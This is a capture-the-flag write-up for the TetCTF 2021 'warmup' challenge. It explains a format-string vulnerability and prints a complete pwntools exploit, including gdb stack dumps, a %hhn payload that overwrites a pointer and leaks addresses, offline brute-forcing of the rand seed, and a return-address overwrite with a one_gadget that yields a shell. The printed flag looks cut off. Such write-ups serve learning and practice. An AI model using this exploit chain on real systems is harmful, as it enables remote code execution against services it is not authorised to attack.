# warmup challenge 

Warmup was the first pwning challenge on [TetCTF 2021](https://ctftime.org/event/1213), along with the warmup binary we are given a libc binary.

## Running the binary

The program is a simple program, you give it the amount of money you want to have (user controlled totally), give it the player's name and you start betting.

As it seems we are betting on randomly generated numbers, if we guess right we gain money, if we guess wrong we lose money.

After losing/stopping the bet we can see the program shows us one last time how much money we have and asks for feedback.

## Analyzing the binary

When we start to reverse engineer the binary we can see the "money" variable is actually a global variable that is stored in the `.bss` section, the money's value must be lower than `0x8000000000000000LL`, if it's not the program will ask the user again "How much money you want?".

We can also see the feedback buffer is allocated using calloc (allocation can assure the memory will be filled with nulls) and the pointer is also stored in the `.bss` section.

The actual game function looks something like this:

```c
void game(PlayerObj *playerObj) {
    __BYTE buf[3];
    int choice;
    unsigned int rand_num;
    __int64 new_amount;
    __int64 bet = 0;
    unsigned int round = 1;
    printf("Player name:");

    // playerObj is an object that includes player's name and the amount of money he has.
    read_input(&playerObj->player_name, 128);
    puts("**************************************************");
    puts("Danh de ra de ma` o? =]]                         *");
    puts("**************************************************");
    printf_with_seperator(&playerObj->player_name); // will look into it in detail later.

    int fd open("/dev/urandom", 0);
    if (fd < 0) {/*Make sure file was opened correctly*/}
    read(fd, &buf, 3);
    close(fd);
    srand(buf);
    while (1) {
        printf("Round: %d\n", round);
        printf("Your money: %lu ZWD\n", *playerObj->amountMoney);
	    printf("Your bet (= 0 to exit): ");
        choice = getChoice();
        rand_num = rand();
        printf("Lucky number: %u\n", rand_num);
        if (choice == rand_num) {
          new_amount = *playerObj->amountMoney + bet;
          *playerObj->amountMoney = new_amount + rand();
        }
        else {
          new_amount = *playerObj->amountMoney - bet;
          *playerObj->amountMoney = new_amount - rand();
        }
        ++round;
    }
}
```

Key notes:

* The seed is a buffer of 3 bytes, we should be able to easily bruteforce it considering we are given the "Lucky number" after every round.
* Since we can know the seed we can control the amount of money we have (win every time and know what is the random amount that is added to the current amount of money we have).
* The name of the player is passed to a print function which might have a string format vulnerability.
* The amount of money is printed so if this would be an interesting pointer we can leak memory this way.



Following the notes the first thing I did was check the printing function, here is it's code below:

```c
void printWithSeperator(char *format_string)
{
  printf(format_string); // format string vuln!
  for ( i = strlen(format_string); i <= 48; ++i )
    putchar(32);
  puts("*");
}
```

So as we guessed there is a format string vulnerability (the only major bug in the code).



Now we move on to how do we want to exploit it, since pretty much all mitigations are enabled it might be difficult, so first let's check if there is something useful on the stack when the vulnerable `printf` is called.

## Exploitation (debugging + writing exploit)!

I am using the `gef` extension for gdb, to put breakpoints on PIE binaries with `gef` you can use the `pie breakpoint` command, I put a breakpoint on the offset `0xd30`, this is where the `printf ` is called!

using the `telescope $rsp` command we can inspect the stack very easily (you can add size after the register if you want), here is the dump I have from the telescope command:

```
0x00007fffffffdc00│+0x0000: 0x0000008000000000   ← $rsp
0x00007fffffffdc08│+0x0008: 0x0000555555757678  →  0x0000000000007025 ("%p"?)
0x00007fffffffdc10│+0x0010: 0x00007fffffffdc80  →  0x00007fffffffdca0  →  0x00007fffffffdcb0  →  0x00005555555551d0  →   push r15
0x00007fffffffdc18│+0x0018: 0x0000555555554b00  →   xor ebp, ebp
0x00007fffffffdc20│+0x0020: 0x00007fffffffdc80  →  0x00007fffffffdca0  →  0x00007fffffffdcb0  →  0x00005555555551d0  →   push r15        ← $rbp
0x00007fffffffdc28│+0x0028: 0x0000555555554e9f  →   lea rdi, [rip+0x3ca]        # 0x555555555270
0x00007fffffffdc30│+0x0030: 0x0000000000000000
0x00007fffffffdc38│+0x0038: 0x0000555555757670  →  0x0000555555756050  →  0x0000000000000000
0x00007fffffffdc40│+0x0040: 0x0000000000000000
0x00007fffffffdc48│+0x0048: 0x0000000000000000
gef➤
```

The most useful thing I can see around here is the offset 0x38, this is a heap pointer (player's object) that is pointing to a `.bss` pointer (money pointer), in the `.bss` resides the amount of money we have as a player.

So the obvious thing is, find something useful (some address in the warmup binary) to overwrite `.bss` pointer with using the string format attack so we can control it's value, the first thing that came to my mind was the `.GOT` table.

#### .GOT simple explanation:

A quick explanation for those who do not know what the `.GOT` is:

The `.GOT` segment contains pointers to function pointers of libc functions, this means if we overwrite one of those pointers we can change the address of a libc function for the given binary, (e.g. we overwrite the address of puts in the `.GOT` with a bunch of 'A', the next time puts will be called the binary will fail because there is no viable memory at address 0x4141414141414141, 0x41 is hex for 'A' ).



After wasting some time on this idea I figured out full relocation is enabled, so we cannot overwrite the .GOT, it's read only in memory, this was a very sad moment :(

When looking for a new Idea I came across the feedback buffer again, which contains a heap address that is stored in the `.bss`, this is perfect for us, we can change the money `.bss` address on the stack to the feedback `.bss` address, this way we can "bet" so we can change it's value (change it's address), and at the end of the program run when we provide feedback we will have Write-what-where with a size of 0x400!

Using the format string attack we can also leak heap addresses from the stack and stack addresses, this is a complete win!

The plan is to overwrite the "money" pointer with a pointer to the feedback `.bss` area, which contains another pointer within it, change this buffer using the "betting" system (should be easy after bruteforcing the seed) to the address of a return pointer on the stack and overwrite it with an address of a one_gadget!



### Writing exploit

I will be using the pwntools library throughout my exploit so get comfortable with it.

also, this code isn't supposed to look or be good, it's supposed to work, but any feedback will be appriciated!

```python
from pwn import *
from ctypes import *
import itertools

def main():
    port = 0 # port
    io = remote("addr", port)

    io.recvuntil("How much money you want?")
    # We want the biggest amount of money possible!
    io.sendline(str(0x8000000000000000-1)) 

	io.recvuntil("Player name:")
    
    # Leak stack and libc addresses and overwrite `.bss` pointer, will explain in detail later!
    io.sendline("%88c%13$hhn|%10$p|%29$p")
    io.recvuntil("|")
    # Get rid of uneeded characters
    leak = io.recvuntil(" *").replace(b" ", b"").replace(b"*", b"") 
    
    # Get stack leak, convert to int and make sure it points to return address
    leak_stack = int(leak.split(b"|")[0],16)+0x38
    # Get libc leak
    leak_libc = int(leak.split(b"|")[1],16)
    libc = ELF("./libc-2.23.so")
    
    # The libc pointer we leaked is a return pointer to `__libc_start_main` in offset 240
    libc_base = leak_libc - (libc.symbols['__libc_start_main']+240)
    io.recvuntil("Your money: ")
	data = io.recv().split(b" ZWD")[0]
	# Get buffer address to make sure we got it.
	addr = int(data, 10)
```

So far all we did was overwrite the money address (`.bss` address) with the feedback's `.bss` address and leaked a valid stack pointer that will point to a return address when feedback is received and leaked a libc pointer and calculated it's base.

#### Going over the format string:

"%88c%13$hhn|%10$p|%29$p"

* %88c - This is just reading 88 characters because we need to overwrite the lower byte of the `.bss` pointer with 0x58.
* %13$hhn - hhn means overwrite the lowest byte when %13 is the offset of the pointer we write to on the stack.
* '|' - pipe lines are used to split the leaks so it's easier to parse later on
* %10$p - The stack pointer is at the offset of 10 pointers on the stack
* %29$p - The libc pointer is at the offset of 29 pointers on the stack

#### Seed brute force:

```python
libc_so = CDLL("./libc-2.23")
rand_nums = []
def main():
    #... (what we wrote before)
    # 5 random numbers seems enough since every one of those is actually 2 random numbers generated.
    for _ in range(5):
        io.sendline("1")
        io.recvuntil("Your choice:")
        io.sendline("1")
        io.recvuntil("Lucky number: ")
        curr_rand = io.recvline()
        
        # Get the random number the program generated and append it to a list
        rand_nums.append(int(curr_rand,10))
        io.recvuntil("Your money: ")
        data = io.recv().split(b" ZWD")[0]
        
        # Update the address so we can use it later
        addr = int(data, 10)
        
    # Try all possible 3 byte combinations for seed
    real_seed = -1
	for seed in range(0xffffff):
        count = 0
        libc_so.srand(seed)
        
        for i in range(5):
            curr_rand = libc_so.rand()
            # The program generates another rand when adding/substracting player's money
            libc_so.rand()
            if rand_nums[i] == curr_rand:
                count += 1
        if count >= 5:
            real_seed = seed
            break
    
```

Now we also have the ability to get the seed of the program using offline bruteforcing, this is awesome!

Last part it to change the "money" to the stack address we need and overwrite the return pointer with the one_gadget



```python
def main():
    # previous code...
    # Needed to get correct "Lucky number"
    to_guess = libc_so.rand()
    
    # Needed to calculate our bet
    add_value = libc_so.rand()
    
    # Calculating our bet by stack addr, curr addr and the add_value the program will generate
    bet = leak_stack - (addr + add value)
    # Send the bet
    io.sendline(str(bet))
    io.recvuntil("Your choice:")
    # Send the guess
    io.sendline(str(to_guess))
    io.recvuntil("Lucky number: ")
    io.recvuntil("Your money: ")
    data = io.recv().split(b" ZWD")[0]
    
    # Make sure correct addr
    addr = int(data, 10)
    assert(addr == stack_addr)
    success("Current addr: {}".format(hex(addr)))
    # Exit betting and give feedback
    io.sendline("0")
    io.recvuntil("feeback: ")
    
    # Get one_gadget address, this is done using the one_gadget tool
	target_addr = libc_base + 0x4527a 
    # Provide feedback.
    # Overwrite with one_gadget address and nulls (nulls are to make sure the constraints on the one_gadget are met)
    io.sendline(p64(target_addr) + b"\x00"*(0x400-8))

    io.interactive()
```



### Proof of flag

```
TetCTF{viettel: *100*311267385452644#
```

